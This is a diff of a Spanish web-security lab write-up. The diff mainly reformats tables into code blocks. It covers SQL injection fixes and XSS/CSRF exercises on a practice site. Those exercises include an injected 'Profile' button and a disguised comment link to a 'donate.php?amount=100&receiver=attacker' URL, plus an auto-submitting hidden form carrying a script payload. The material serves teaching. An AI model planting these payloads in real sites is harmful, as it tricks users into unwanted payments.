@@ -61,7 +61,7 @@ Esto os permite estudiar el código fuente de “add_comment.php” y encontrar 
 | Vulnerabilidad detectada… | Inyección SQL |
 | --- | --- |
 | Descripción del ataque… | Se aprovecha de la falta de validación para que, con una consulta SQL adecuada, pueda escribir comentarios bajo el nombre de otro usuario |
-| ¿Cómo podemos hacer que sea segura esta entrada? | Utilizar consultas preparadas, validar y sanear los datos de entrada, y utilizar funciones de seguridad específicas de la base de datos, como ‘SQLite3::scapeString()’ en conjunto con las consultas preparadas:  
+| ¿Cómo podemos hacer que sea segura esta entrada? | Utilizar consultas preparadas, validar y sanear los datos de entrada, y utilizar funciones de seguridad específicas de la base de datos, como ‘SQLite3::scapeString()’ en conjunto con las consultas preparadas: |
 
 Utilizar consultas preparadas
 
@@ -80,7 +80,7 @@ Validar y sanear los datos de entrada:
 $user_id = intval($_POST['user_id']);  
 $comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');  
   
-``` |
+```
 
 # Parte 2 – XXS <div id="xss" />
 
@@ -191,13 +191,20 @@ Ahora ya sabemos que podemos realizar un ataque XSS. Hemos preparado el siguient
 
 Editad un jugador para conseguir que, en el listado de jugadores (list_players.php) aparezca, debajo del nombre de su equipo y antes de “(show/add comments)” un botón llamado “Profile” que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.
 
-| En el campo… | Teams |
-| --- | --- |
-| Introduzco… | <br><button type="button" href="http://web.pagos/donate.php?amount=100&receiver=attacker">Profile</button> |
+- En el campo… : Teams
+- Introduzco… :
+
+```html
+
+<br><button type="button" href="http://web.pagos/donate.php?amount=100&receiver=attacker">Profile</button> 
+
+```
 
 ## Parte b)
 
 Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que el usuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (show_comments.php).
+
+```html
 
 <style>
     .prueba {
@@ -217,6 +224,8 @@ Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentarí
 
 No está mal como <a href="http://web.pagos/donate.php?amount=100&receiver=attacker" target="_blank" class="prueba">jugador</a>
 
+```
+
 ## Parte c)
 
 Pero 'web.pagos' sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.
@@ -230,6 +239,8 @@ Si 'web.pagos' modifica la página 'donate.php' para que reciba los parámetros 
 
 Debido a no tener el código fuente de web.pagos, no podemos garantizar que quede blindado contra estos tipos de ataques, dado que puede mantenerse la posibilidad de hacerse ataques XSS, pudiendo ser así:
 
+```html
+
 <form id="maliciousForm" action="https://web.pagos/donate.php" method="POST">
     <input type="hidden" name="amount" value="<script>alert('¡Ataque XSS!');</script>">
     <input type="hidden" name="receiver" value="usuarioMalicioso">
@@ -239,3 +250,5 @@ Debido a no tener el código fuente de web.pagos, no podemos garantizar que qued
 <script>
     document.getElementById('maliciousForm').submit();
 </script> 
+
+```
